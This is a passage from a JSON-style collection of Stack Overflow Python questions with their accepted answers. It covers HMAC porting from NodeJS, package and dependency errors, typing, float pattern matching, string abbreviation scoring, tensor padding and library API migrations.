    "Body": "I got the following Javascript code and I need to convert it to Python(I'm not an expert in hashing so sorry for my knowledge on this subject)\nfunction generateAuthHeader(dataToSign) {\n    let apiSecretHash = new Buffer(\"Rbju7azu87qCTvZRWbtGqg==\", 'base64');\n    let apiSecret = apiSecretHash.toString('ascii');\n    var hash = CryptoJS.HmacSHA256(dataToSign, apiSecret);\n    return hash.toString(CryptoJS.enc.Base64);\n}\n\nwhen I ran generateAuthHeader(\"abc\") it returned +jgBeooUuFbhMirhh1KmQLQ8bV4EXjRorK3bR/oW37Q=\nSo I tried writing the following Python code:\ndef generate_auth_header(data_to_sign):\n    api_secret_hash = bytearray(base64.b64decode(\"Rbju7azu87qCTvZRWbtGqg==\"))\n    hash = hmac.new(api_secret_hash, data_to_sign.encode(), digestmod=hashlib.sha256).digest()\n    return base64.b64encode(hash).decode()\n\nBut when I ran generate_auth_header(\"abc\") it returned a different result aOGo1XCa5LgT1CIR8C1a10UARvw2sqyzWWemCJBJ1ww=\nCan someone tell me what is wrong with my Python code and what I need to change?\nThe base64 is the string I generated myself for this post\nUPDATE:\nthis is the document I'm working with\n//Converting the Rbju7azu87qCTvZRWbtGqg== (key) into byte array \n//Converting the data_to_sign into byte array \n//Generate the hmac signature\n\nit seems like apiSecretHash and api_secret_hash is different, but I don't quite understand as the equivalent of new Buffer() in NodeJS is bytearray() in python\n",
    "AcceptedAnswerId": 73769662,
    "AcceptedAnswer": "It took me 2 days to look it up and ask for people in python discord and I finally got an answer. Let me summarize the problems:\n\nAPI secret hash from both return differents hash of the byte array\njavascript\n\nJavascript\napiSecret = \"E8nm,ns:\\u0002NvQY;F*\"\n\nPython\napi_secret_hash = b'E\\xb8\\xee\\xed\\xac\\xee\\xf3\\xba\\x82N\\xf6QY\\xbbF\\xaa'\n\nonce we replaced the hash with python code it return the same result\ndef generate_auth_header(data_to_sign):\n    api_secret_hash = \"E8nm,ns:\\u0002NvQY;F*\".encode()\n\n    hash = hmac.new(api_secret_hash, data_to_sign.encode(), digestmod=hashlib.sha256).digest()\n    return base64.b64encode(hash).decode()\n\nencoding for ASCII in node.js you can find here https://github.com/nodejs/node/blob/a2a32d8beef4d6db3a8c520572e8a23e0e51a2f8/src/string_bytes.cc#L636-L647\ncase ASCII:\n  if (contains_non_ascii(buf, buflen)) {\n    char* out = node::UncheckedMalloc(buflen);\n    if (out == nullptr) {\n      *error = node::ERR_MEMORY_ALLOCATION_FAILED(isolate);\n      return MaybeLocal();\n    }\n    force_ascii(buf, out, buflen);\n    return ExternOneByteString::New(isolate, out, buflen, error);\n  } else {\n    return ExternOneByteString::NewFromCopy(isolate, buf, buflen, error);\n  }\n\nthere is this force_ascii() function that is called when the data contains non-ASCII characters which is implemented here https://github.com/nodejs/node/blob/a2a32d8beef4d6db3a8c520572e8a23e0e51a2f8/src/string_bytes.cc#L531-L573\nso we need to check for the hash the same as NodeJS one, so we get the final version of the Python code:\ndef generate_auth_header(data_to_sign):\n    # convert to bytearray so the for loop below can modify the values\n    api_secret_hash = bytearray(base64.b64decode(\"Rbju7azu87qCTvZRWbtGqg==\"))\n    \n    # \"force\" characters to be in ASCII range\n    for i in range(len(api_secret_hash)):\n        api_secret_hash[i] &= 0x7f;\n\n    hash = hmac.new(api_secret_hash, data_to_sign.encode(), digestmod=hashlib.sha256).digest()\n    return base64.b64encode(hash).decode()\n\nnow it returned the same result as NodeJS one\nThank you Mark from the python discord for helping me understand and fix this!\nHope anyone in the future trying to convert byte array from javascript to python know about this different of NodeJS Buffer() function\n"
}
{
    "Id": 72511979,
    "PostTypeId": 1,
    "Title": "ValueError: install DBtypes to use this function",
    "Body": "I'm using BigQuery for the first time.\nclient.list_rows(table, max_results = 5).to_dataframe();\n\nWhenever I use to_dataframe() it raises this error:\n\nValueError: Please install the 'db-dtypes' package to use this function.\n\nI found this similar problem (almost exactly the same), but I can't understand how to implement their proposed solution.\n",
    "AcceptedAnswerId": 72514645,
    "AcceptedAnswer": "I was able to replicate your use case as shown below.\n\nEasiest solution is to pip install db-dtypes as mentioned by @MattDMo.\nOr you can specify previous version of google-cloud-bigquery by creating a requirements.txt with below contents:\ngoogle-cloud-bigquery==2.34.3\n\nAnd then pip install by using command as shown below:\npip install -r /path/to/requirements.txt\n\nOutput of my sample replication:\n\n"
}
{
    "Id": 72294299,
    "PostTypeId": 1,
    "Title": "Multiple top-level packages discovered in a flat-layout",
    "Body": "I am trying to install a library from the source that makes use of Poetry, but I get this error\nerror: Multiple top-level packages discovered in a flat-layout: ['tulips', 'fixtures'].\n        \nTo avoid accidental inclusion of unwanted files or directories,\nsetuptools will not proceed with this build.\n        \nIf you are trying to create a single distribution with multiple packages\non purpose, you should not rely on automatic discovery.\nInstead, consider the following options:\n        \n1. set up custom discovery (`find` directive with `include` or `exclude`)\n2. use a `src-layout`\n3. explicitly set `py_modules` or `packages` with a list of names\n        \nTo find more information, look for \"package discovery\" on setuptools docs\n\nWhat do I need to do to fix it?\n",
    "AcceptedAnswerId": 72547402,
    "AcceptedAnswer": "Based on this comment on a GitHub issue, adding the following lines to your pyproject.toml might solve your problem:\n[tool.setuptools]\npy-modules = []\n\n(For my case, the other workaround provided in that comment, i.e. adding py_modules=[] as a keyword argument to the setup() function in setup.py  worked)\n"
}
{
    "Id": 72199354,
    "PostTypeId": 1,
    "Title": "Python type hinting for a generic mutable tuple / fixed length sequence with multiple types",
    "Body": "I am currently working on adding type hints to a project and can't figure out how to get this right. I have a list of lists, with the nested list containing two elements of type int and float. The first element of the nested list is always an int and the second is always a float.\nmy_list = [[1000, 5.5], [1432, 2.2], [1234, 0.3]]\n\nI would like to type annotate it so that unpacking the inner list in for loops or loop comprehensions keeps the type information. I could change the inner lists to tuples and would get what I'm looking for:\ndef some_function(list_arg: list[tuple[int, float]]): pass\n\n\nHowever, I need the inner lists to be mutable. Is there a nice way to do this for lists? I know that abstract classes like Sequence and Collection do not support multiple types.\n",
    "AcceptedAnswerId": 73817809,
    "AcceptedAnswer": "I think the question highlights a fundamental difference between statically typed Python and dynamically typed Python. For someone who is used to dynamically typed Python (or Perl or JavaScript or any number of other scripting languages), it's perfectly normal to have diverse data types in a list. It's convenient, flexible, and doesn't require you to define custom data types. However, when you introduce static typing, you step into a tighter box that requires more rigorous design.\nAs several others have already pointed out, type annotations for lists require all elements of the list to be the same type, and don't allow you to specify a length. Rather than viewing this as a shortcoming of the type system, you should consider that the flaw is in your own design. What you are really looking for is a class with two data members. The first data member is named 0, and has type int, and the second is named 1, and has type float. As your friend, I would recommend that you define a proper class, with meaningful names for these data members. As I'm not sure what your data type represents, I'll make up names, for illustration.\nclass Sample:\n    def __init__(self, atomCount: int, atomicMass: float):\n        self.atomCount = atomCount\n        self.atomicMass = atomicMass\n\nThis not only solves the typing problem, but also gives a major boost to readability. Your code would now look more like this:\nmy_list = [Sample(1000, 5.5), Sample(1432, 2.2), Sample(1234, 0.3)]\n\ndef some_function(list_arg: list[Sample]): pass\n\nI do think it's worth highlighting Stef's comment, which points to this question. The answers given highlight two useful features related to this.\nFirst, as of Python 3.7, you can mark a class as a data class, which will automatically generate methods like __init__(). The Sample class would look like this, using the @dataclass decorator:\nfrom dataclasses import dataclass\n\n@dataclass\nclass Sample:\n    atomCount: int\n    atomicMass: float\n\nAnother answer to that question mentions a PyPi package called recordclass, which it says is basically a mutable namedtuple. The typed version is called RecordClass\nfrom recordclass import RecordClass\n\nclass Sample(RecordClass):\n    atomCount: int\n    atomicMass: float\n\n"
}
{
    "Id": 73302071,
    "PostTypeId": 1,
    "Title": "NoneType error when trying to use pdb via FormmatedTB",
    "Body": "When executing the following code:\nfrom IPython.core import ultratb\nsys.excepthook = ultratb.FormattedTB(mode='Verbose', color_scheme='Linux', call_pdb=1)\n\nIn order to catch exceptions, I receive the following error:\nTraceback (most recent call last):\n  File \"\", line 1, in \n  File \"/Users/dinari/miniconda3/envs/testenv/lib/python3.8/site-packages/IPython/core/ultratb.py\", line 994, in __init__\n    VerboseTB.__init__(self, color_scheme=color_scheme, call_pdb=call_pdb,\n  File \"/Users/dinari/miniconda3/envs/testenv/lib/python3.8/site-packages/IPython/core/ultratb.py\", line 638, in __init__\n    TBTools.__init__(\n  File \"/Users/dinari/miniconda3/envs/testenv/lib/python3.8/site-packages/IPython/core/ultratb.py\", line 242, in __init__\n    self.pdb = debugger_cls()\nTypeError: 'NoneType' object is not callable\n\nUsing python 3.8.2 and IPython 8.4.0\npdb otherwise is working fine.\nAny idea for a fix for this?\n",
    "AcceptedAnswerId": 73304196,
    "AcceptedAnswer": "Downgrading IPython to 7.34.0 solved this.\n"
}
{
    "Id": 72554445,
    "PostTypeId": 1,
    "Title": "Pandas: convert a series which contains strings like \"10%\" and \"0.10\" into numeric",
    "Body": "What is the best way to convert a Pandas series that contains strings of the type \"10%\" and \"0.10\" into numeric values?\nI know that if I have a series with just \"0.10\" type strings I can just do pd.to_numeric.\nI also know that if I have a series of \"10%\" type strings I can do str.replace(\"%\",\"\") and then do pd.to_numeric and divide by 100.\nThe issue I have is for a series with a mix of \"0.10\" and \"10%\" type strings. How do I best convert this into a series with the correct numeric types.\nI think I could do it by first making a temporary series with True / False depending on if the string has \"%\" in it or not and then based on that applying a function. But this seems inefficient.\nIs there a better way?\nWhat I Have Tried for Reference:\nmixed = pd.Series([\"10%\",\"0.10\",\"5.5%\",\"0.02563\"])\nmixed.str.replace(\"%\",\"\").astype(\"float\")/100\n\n0    0.100000\n1    0.001000\n2    0.055000\n3    0.000256\ndtype: float64\n# This doesn't work, because even the 0.10 and 0.02563 are divided by 100.\n\n",
    "AcceptedAnswerId": 72554525,
    "AcceptedAnswer": "The easiest solution is to select entries using a mask and handle them in bulk:\nfrom pandas import Series, to_numeric\n\nmixed = Series([\"10%\", \"0.10\", \"5.5%\", \"0.02563\"])\n\n# make an empty series with similar shape and dtype float\nconverted = Series(index=mixed.index, dtype='float')\n\n# use a mask to select specific entries\nmask = mixed.str.contains(\"%\")\n\nconverted.loc[mask] = to_numeric(mixed.loc[mask].str.replace(\"%\", \"\")) / 100\nconverted.loc[~mask] = to_numeric(mixed.loc[~mask])\n\nprint(converted)\n# 0    0.10000\n# 1    0.10000\n# 2    0.05500\n# 3    0.02563\n# dtype: float64\n\n"
}
{
    "Id": 73302356,
    "PostTypeId": 1,
    "Title": "How to make pip fail early when one of the requested requirements does not exist?",
    "Body": "Minimal example:\npip install tensorflow==2.9.1 non-existing==1.2.3\n\nDefaulting to user installation because normal site-packages is not writeable\nLooking in indexes: https://pypi.org/simple, https://pypi.ngc.nvidia.com\nCollecting tensorflow==2.9.1\n  Downloading tensorflow-2.9.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (511.7 MB)\n     \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 511.7/511.7 MB 7.6 MB/s eta 0:00:00\nERROR: Could not find a version that satisfies the requirement non-existing==1.2.3 (from versions: none)\nERROR: No matching distribution found for non-existing==1.2.3\n\n\nSo pip downloads the (rather huge) TensorFlow first, only to then tell me that non-existing does not exist.\nIs there a way to make it fail earlier, i.e., print the error and quit before downloading?\n",
    "AcceptedAnswerId": 73304263,
    "AcceptedAnswer": "I'm afraid there's no straightforward way of handling it. I ended up writing a simple bash script where I check the availability of packages using pip's index command:\ncheck_packages_availability () {\n  while IFS= read -r line || [ -n \"$line\" ]; do\n      package_name=\"${line%%=*}\"\n      package_version=\"${line#*==}\"\n\n      if ! pip index versions $package_name | grep \"$package_version\"; then\n        echo \"package $line not found\"\n        exit -1\n      fi\n  done < requirements.txt\n}\n\nif ! check_packages_availability; then\n  pip install -r requirements.txt\nfi\n\nThis is a hacky solution but may work. For every package in requirements.txt this script tries to retrieve information about it and match the specified version. If everything's alright it starts installing them.\n\nOr you can use poetry, it handles resolving dependencies for you, for example:\npyproject.toml\n[tool.poetry]\nname = \"test_missing_packages\"\nversion = \"0.1.0\"\ndescription = \"\"\nauthors = [\"funnydman\"]\n\n[tool.poetry.dependencies]\npython = \"^3.10\"\ntensorflow = \"2.9.1\"\nnon-existing = \"1.2.3\"\n\n[build-system]\nrequires = [\"poetry-core>=1.0.0\"]\nbuild-backend = \"poetry.core.masonry.api\"\n\nAt the resolving stage it throws exception without installing/downloading packages:\nUpdating dependencies\nResolving dependencies... (0.2s)\n\nSolverProblemError\n    \nBecause test-missing-packages depends on non-existing (1.2.3) which doesn't match any versions, version solving failed.\n\n"
}
{
    "Id": 72596436,
    "PostTypeId": 1,
    "Title": "How to perform approximate structural pattern matching for floats and complex",
    "Body": "I've read about and understand floating point round-off issues such as:\n>>> sum([0.1] * 10) == 1.0\nFalse\n\n>>> 1.1 + 2.2 == 3.3\nFalse\n\n>>> sin(radians(45)) == sqrt(2) / 2\nFalse\n\nI also know how to work around these issues with math.isclose() and cmath.isclose().\nThe question is how to apply those work arounds to Python's match/case statement.  I would like this to work:\nmatch 1.1 + 2.2:\n    case 3.3:\n        print('hit!')  # currently, this doesn't match\n\n",
    "AcceptedAnswerId": 72596437,
    "AcceptedAnswer": "The key to the solution is to build a wrapper that overrides the __eq__ method and replaces it with an approximate match:\nimport cmath\n\nclass Approximately(complex):\n\n    def __new__(cls, x, /, **kwargs):\n        result = complex.__new__(cls, x)\n        result.kwargs = kwargs\n        return result\n\n    def __eq__(self, other):\n        try:\n            return isclose(self, other, **self.kwargs)\n        except TypeError:\n            return NotImplemented\n\nIt creates approximate equality tests for both float values and complex values:\n>>> Approximately(1.1 + 2.2) == 3.3\nTrue\n>>> Approximately(1.1 + 2.2, abs_tol=0.2) == 3.4\nTrue\n>>> Approximately(1.1j + 2.2j) == 0.0 + 3.3j\nTrue\n\nHere is how to use it in a match/case statement:\nfor x in [sum([0.1] * 10), 1.1 + 2.2, sin(radians(45))]:\n    match Approximately(x):\n        case 1.0:\n            print(x, 'sums to about 1.0')\n        case 3.3:\n            print(x, 'sums to about 3.3')\n        case 0.7071067811865475:\n            print(x, 'is close to sqrt(2) / 2')\n        case _:\n            print('Mismatch')\n\nThis outputs:\n0.9999999999999999 sums to about 1.0\n3.3000000000000003 sums to about 3.3\n0.7071067811865475 is close to sqrt(2) / 2\n\n"
}
{
    "Id": 72766397,
    "PostTypeId": 1,
    "Title": "Abbreviation similarity between strings",
    "Body": "I have a use case in my project where I need to compare a key-string with a lot many strings for similarity. If this value is greater than a certain threshold, I consider those strings \"similar\" to my key and based on that list, I do some further calculations / processing.\nI have been exploring fuzzy matching string similarity stuff, which use edit distance based algorithms like \"levenshtein, jaro and jaro-winkler\" similarities.\nAlthough they work fine, I want to have a higher similarity score if one string is \"abbreviation\" of another. Is there any algorithm/ implementation I can use for this.\nNote:\nlanguage: python3 \npackages explored: fuzzywuzzy, jaro-winkler\n\nExample:\nusing jaro_winkler similarity:\n\n>>> jaro.jaro_winkler_metric(\"wtw\", \"willis tower watson\")\n0.7473684210526316\n>>> jaro.jaro_winkler_metric(\"wtw\", \"willistowerwatson\")\n0.7529411764705883\n\nusing levenshtein similarity:\n\n>>> fuzz.ratio(\"wtw\", \"willis tower watson\")\n27\n>>> fuzz.ratio(\"wtw\", \"willistowerwatson\")\n30\n>>> fuzz.partial_ratio(\"wtw\", \"willistowerwatson\")\n67\n>>> fuzz.QRatio(\"wtw\", \"willistowerwatson\")\n30\n\nIn these kind of cases, I want score to be higher (>90%) if possible. I'm ok with few false positives as well, as they won't cause too much issue with my further calculations. But if we match s1 and s2 such that s1 is fully contained in s2 (or vice versa), their similarity score should be much higher.\nEdit: Further Examples for my Use-Case\nFor me, spaces are redundant. That means, wtw is considered abbreviation for \"willistowerwatson\" and \"willis tower watson\" alike.\nAlso, stove is a valid abbreviation for \"STack OVErflow\" or \"STandardOVErview\"\nA simple algo would be to start with 1st char of smaller string and see if it is present in the larger one. Then check for 2nd char and so on until the condition satisfies that 1st string is fully contained in 2nd string. This is a 100% match for me.\nFurther examples like wtwx to \"willistowerwatson\" could give a score of, say 80% (this can be based on some edit distance logic). Even if I can find a package which gives either True or False for abbreviation similarity would also be helpful.\n",
    "AcceptedAnswerId": 72870998,
    "AcceptedAnswer": "You can use a recursive algorithm, similar to sequence alignment. Just don't give penalty for shifts (as they are expected in abbreviations) but give one for mismatch in first characters.\nThis one should work, for example:\ndef abbreviation(abr,word,penalty=1):\n    if len(abr)==0:\n        return 0\n    elif len(word)==0:\n        return penalty*len(abr)*-1\n    elif abr[0] == word[0]:\n        if len(abr)>1:\n            return 1 + max(abbreviation(abr[1:],word[1:]),\n                           abbreviation(abr[2:],word[1:])-penalty)\n        else:\n            return 1 + abbreviation(abr[1:],word[1:])\n    else:\n        return abbreviation(abr,word[1:])\n\ndef compute_match(abbr,word,penalty=1):\n    score = abbreviation(abbr.lower(),\n                         word.lower(),\n                         penalty)\n    if abbr[0].lower() != word[0].lower(): score-=penalty\n    \n    score = score/len(abbr)\n\n    return score\n\n\nprint(compute_match(\"wtw\", \"willis tower watson\"))\nprint(compute_match(\"wtwo\", \"willis tower watson\"))\nprint(compute_match(\"stove\", \"Stackoverflow\"))\nprint(compute_match(\"tov\", \"Stackoverflow\"))\nprint(compute_match(\"wtwx\", \"willis tower watson\"))\n\nThe output is:\n1.0\n1.0\n1.0\n0.6666666666666666\n0.5\n\nIndicating that wtw and wtwo are perfectly valid abbreviations for willistowerwatson, that stove is a valid abbreviation of Stackoverflow but not tov, which has the wrong first character.\nAnd wtwx is only partially valid abbreviation for willistowerwatson beacuse it ends with a character that does not occur in the full name.\n"
}
{
    "Id": 73269000,
    "PostTypeId": 1,
    "Title": "Efficient logic to pad tensor",
    "Body": "I'm trying to pad a tensor of some shape such that the total memory used by the tensor is always a multiple of 512\nE.g.\nTensor shape 16x1x1x4 of type SI32 (Multiply by 4 to get total size)\nThe total elements are 16x4x1x1 = 64\nTotal Memory required 64x**4** = 256 (Not multiple of 512)\nPadded shape would be 32x1x1x4 = 512\n\nThe below logic works for the basic shape but breaks with a shape e.g. 16x51x1x4 SI32 or something random say 80x240x1x1 U8\nThe padding logic goes like below\nfrom functools import reduce\n\nDATA_TYPE_MULTIPLYER = 2 # This would change at runtime with different type e.g. 8 with U8 16 with F16 32 with SI32\n\nALIGNMENT = 512 #Always Constant\nCHAR_BIT = 8    # Always Const for given fixed Arch\n\ndef approachOne(tensor):\n    totalElements = reduce((lambda x, y: x * y), tensor)\n    totalMemory = totalElements * DATA_TYPE_MULTIPLYER\n    \n    divisor = tensor[1] * tensor[2] * tensor[3]\n    tempDimToPad = totalElements/divisor\n    orgDimToPad = totalElements/divisor\n    while (True):\n        if ((tempDimToPad * divisor * DATA_TYPE_MULTIPLYER) % ALIGNMENT == 0):\n            return int(tempDimToPad - orgDimToPad)\n        tempDimToPad = tempDimToPad + 1;\n    \ndef getPadding(tensor):\n    totalElements = reduce((lambda x, y: x * y), tensor)\n    totalMemory = totalElements * DATA_TYPE_MULTIPLYER\n    newSize = totalMemory + (ALIGNMENT - (totalMemory % ALIGNMENT))\n    newTotalElements = (newSize * CHAR_BIT) / (CHAR_BIT * DATA_TYPE_MULTIPLYER)\n    \n    # Any DIM can be padded, using first for now\n    paddingValue = tensor[0] \n    padding =  int(((newTotalElements * paddingValue) / totalElements) - paddingValue)\n    return padding\n    \ntensor = [11, 7, 3, 5]\nprint(getPadding(tensor))\nprint(approachOne(tensor))\n\ntensorflow package may help here but I'm originally coding in C++ so just posting in python with a minimal working example\nAny help is appreciated, thanks\nApproach 1\nthe brute force approach is to keep on incrementing across any chosen dimension by 1 and check if the totalMemory is multiple of 512. The brute force approach works but doesn't give the minimal padding and bloats the tensor\nUpdating the conditions\nInitially the approach was to pad across the first dim. Since always padding the first dimension my not be the best solution, just getting rid of this constraint\n",
    "AcceptedAnswerId": 73336113,
    "AcceptedAnswer": "If you want the total memory to be a multiple of 512 then the number of elements in the tensor must be a multiple of 512 // DATA_TYPE_MULTIPLIER, e.g. 128 in your case. Whatever that number is, it will have a prime factorization of the form 2**n. The number of elements in the tensor is given by s[0]*s[1]*...*s[d-1] where s is a sequence containing the shape of the tensor and d is an integer, the number of dimensions. The product s[0]*s[1]*...*s[d-1] also has some prime factorization and it is a multiple of 2**n if and only if it contains these prime factors. I.e. the task is to pad the individual dimensions s[i] such that the resulting prime factorization of the product s[0]*s[1]*...*s[d-1] contains 2**n.\nIf the goal is to reach a minimum possible size of the padded tensor, then one can simply iterate through all multiples of the given target number of elements to find the first one that can be satisfied by padding (increasing) the individual dimensions of the tensor (1). A dimension must be increased as long as it contains at least one prime factor that is not contained in the target multiple size. After all dimensions have been increased such that their prime factors are contained in the target multiple size, one can check the resulting size of the candidate shape: if it matches the target multiple size we are done; if its prime factors are a strict subset of the target multiple prime factors, we can add the missing prime factors to any of the dimensions (e.g. the first); otherwise, we can use the excess prime factors to store the candidate shape for a future (larger) multiplier. The first such future multiplier then marks an upper boundary for the iteration over all possible multipliers, i.e. the algorithm will terminate. However, if the candidate shape (after adjusting all the dimensions) has an excess of prime factors w.r.t. the target multiple size as well as misses some other prime factors, the only way is to iterate over all possible padded shapes with size bound by the target multiple size.\nThe following is an example implementation:\nfrom collections import Counter\nimport itertools as it\nimport math\nfrom typing import Iterator, Sequence\n\n\ndef pad(shape: Sequence[int], target: int) -> tuple[int,...]:\n    \"\"\"Pad the given `shape` such that the total number of elements\n       is a multiple of the given `target`.\n    \"\"\"\n    size = math.prod(shape)\n    if size % target == 0:\n        return tuple(shape)\n\n    target_prime_factors = get_prime_factors(target)\n\n    solutions: dict[int, tuple[int,...]] = {}  # maps `target` multipliers to corresponding padded shapes\n\n    for multiplier in it.count(math.ceil(size / target)):\n\n        if multiplier in solutions:\n            return solutions[multiplier]\n\n        prime_factors = [*get_prime_factors(multiplier), *target_prime_factors]\n        \n        def good(x):\n            return all(f in prime_factors for f in get_prime_factors(x))\n\n        candidate = list(shape)\n        for i, x in enumerate(candidate):\n            while not good(x):\n                x += 1\n            candidate[i] = x\n\n        if math.prod(candidate) == multiplier*target:\n            return tuple(candidate)\n\n        candidate_prime_factor_counts = Counter(f for x in candidate for f in get_prime_factors(x))\n        target_prime_factor_counts = Counter(prime_factors)\n\n        missing = target_prime_factor_counts - candidate_prime_factor_counts\n        excess = candidate_prime_factor_counts - target_prime_factor_counts\n\n        if not excess:\n            return (\n                candidate[0] * math.prod(k**v for k, v in missing.items()),\n                *candidate[1:],\n            )\n        elif not missing:\n            solutions[multiplier * math.prod(k**v for k, v in excess.items())] = tuple(candidate)\n        else:\n            for padded_shape in generate_all_padded_shapes(shape, bound=multiplier*target):\n                padded_size = math.prod(padded_shape)\n                if padded_size == multiplier*target:\n                    return padded_shape\n                elif padded_size % target == 0:\n                    solutions[padded_size // target] = padded_shape\n\n\ndef generate_all_padded_shapes(shape: Sequence[int], *, bound: int) -> Iterator[tuple[int,...]]:\n    head, *tail = shape\n    if bound % head == 0:\n        max_value = bound // math.prod(tail)\n    else:\n        max_value = math.floor(bound / math.prod(tail))\n    for x in range(head, max_value+1):\n        if tail:\n            yield from ((x, *other) for other in generate_all_padded_shapes(tail, bound=math.floor(bound/x)))\n        else:\n            yield (x,)\n\n\ndef get_prime_factors(n: int) -> list[int]:\n    \"\"\"From: https://stackoverflow.com/a/16996439/3767239\n       Replace with your favorite prime factorization method.\n    \"\"\"\n    primfac = []\n    d = 2\n    while d*d <= n:\n        while (n % d) == 0:\n            primfac.append(d)  # supposing you want multiple factors repeated\n            n //= d\n        d += 1\n    if n > 1:\n       primfac.append(n)\n    return primfac\n\nHere are a few examples:\npad((16, 1, 1), 128) = (128, 1, 1)\npad((16, 51, 1, 4), 128) = (16, 52, 1, 4)\npad((80, 240, 1, 1), 128) = (80, 240, 1, 1)\npad((3, 5, 7, 11), 128) = (3, 5, 8, 16)\npad((3, 3, 3, 1), 128) = (8, 4, 4, 1)\npad((7, 7, 7, 7), 128) = (7, 8, 8, 8)\npad((9, 9, 9, 9), 128) = (10, 10, 10, 16)\n\n\nFootnotes:\n(1) In fact, we need to find the roots of the polynomial (s[0]+x[0])*(s[1]+x[1])*...*(s[d-1]+x[d-1]) - multiple*target for x[i] >= 0 over the domain of integers. However, I am not aware of any algorithm to solve this problem.\n"
}
{
    "Id": 72133316,
    "PostTypeId": 1,
    "Title": "libssl.so.1.1: cannot open shared object file: No such file or directory",
    "Body": "I've just updated to Ubuntu 22.04 LTS and my libs using OpenSSL just stopped working.\nLooks like Ubuntu switched to the version 3.0 of OpenSSL.\nFor example, poetry stopped working:\nTraceback (most recent call last):\n  File \"/home/robz/.local/bin/poetry\", line 5, in \n    from poetry.console import main\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/console/__init__.py\", line 1, in \n    from .application import Application\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/console/application.py\", line 7, in \n    from .commands.about import AboutCommand\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/console/commands/__init__.py\", line 4, in \n    from .check import CheckCommand\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/console/commands/check.py\", line 2, in \n    from poetry.factory import Factory\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/factory.py\", line 18, in \n    from .repositories.pypi_repository import PyPiRepository\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/repositories/pypi_repository.py\", line 33, in \n    from ..inspection.info import PackageInfo\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/inspection/info.py\", line 25, in \n    from poetry.utils.env import EnvCommandError\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/utils/env.py\", line 23, in \n    import virtualenv\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/virtualenv/__init__.py\", line 3, in \n    from .run import cli_run, session_via_cli\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/virtualenv/run/__init__.py\", line 11, in \n    from ..seed.wheels.periodic_update import manual_upgrade\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/virtualenv/seed/wheels/__init__.py\", line 3, in \n    from .acquire import get_wheel, pip_wheel_env_run\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/virtualenv/seed/wheels/acquire.py\", line 12, in \n    from .bundle import from_bundle\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/virtualenv/seed/wheels/bundle.py\", line 4, in \n    from .periodic_update import periodic_update\n  File \"/home/robz/.local/share/pypoetry/venv/lib/python3.9/site-packages/virtualenv/seed/wheels/periodic_update.py\", line 10, in \n    import ssl\n  File \"/home/robz/.pyenv/versions/3.9.10/lib/python3.9/ssl.py\", line 98, in \n    import _ssl             # if we can't import it, let the error propagate\nImportError: libssl.so.1.1: cannot open shared object file: No such file or directory\n\nIs there an easy fix ? For example, having libssl.so.1.1 available without having to uninstall OpenSSL 3 (I don't know if it's even possible).\n",
    "AcceptedAnswerId": 72633324,
    "AcceptedAnswer": "This fixes it (a problem with packaging in 22.04):\nwget http://nz2.archive.ubuntu.com/ubuntu/pool/main/o/openssl/libssl1.1_1.1.1f-1ubuntu2.17_amd64.deb\n\nsudo dpkg -i libssl1.1_1.1.1f-1ubuntu2.17_amd64.deb\n\nPS: If the link is expired, check http://nz2.archive.ubuntu.com/ubuntu/pool/main/o/openssl/?C=M;O=D for a valid one.\nCurrent version is: libssl1.1_1.1.1f-1ubuntu2.17_amd64.deb\n"
}
{
    "Id": 72325242,
    "PostTypeId": 1,
    "Title": "type object 'Base' has no attribute '_decl_class_registry'",
    "Body": "I am upgrading a library to a recent version of SQLAlchemy and I am getting this error\n\ntype object 'Base' has no attribute '_decl_class_registry'\n\nOn line\nBase = declarative_base(metadata=metadata)\n\nBase._decl_class_registry\n\nHow can I solve this?\n",
    "AcceptedAnswerId": 72738555,
    "AcceptedAnswer": "Had the same problem. Because of my upgrade of sqlalchemy looks like there is a change in the base code.\nuse this instead to accomplish the same\nBase.registry._class_registry.values()\n\n"
}
{
    "Id": 73924768,
    "PostTypeId": 1,
    "Title": "AttributeError: module 'flax' has no attribute 'nn'",
    "Body": "I'm trying to run RegNeRF, which requires flax. On installing the latest version of flax==0.6.0, I got an error stating flax has no attribute optim. This answer suggested to downgrade flax to 0.5.1. On doing that, now I'm getting the error AttributeError: module 'flax' has no attribute 'nn'\nI could not find any solutions on the web for this error. Any help is appreciated.\nI'm using ubuntu 20.04\n",
    "AcceptedAnswerId": 73926711,
    "AcceptedAnswer": "The flax.optim module has been moved to optax as of flax version 0.6.0; see Upgrading my Codebase to Optax for information on how to migrate your code. If you're using external code that imports flax.optim and can't update these references, you'll have to install flax version 0.5.3 or older.\nRegarding flax.nn: this module was replaced by flax.linen in flax version 0.4.0. See Upgrading my Codebase to Linen for information on this migration. If you're using external code that imports flax.nn and can't update these references, you'll have to install flax version 0.3.6 or older.\n"
}
{
    "Id": 71530764,
    "PostTypeId": 1,
    "Title": "Binance order: Timestamp for this request was 1000ms ahead of the server's time",
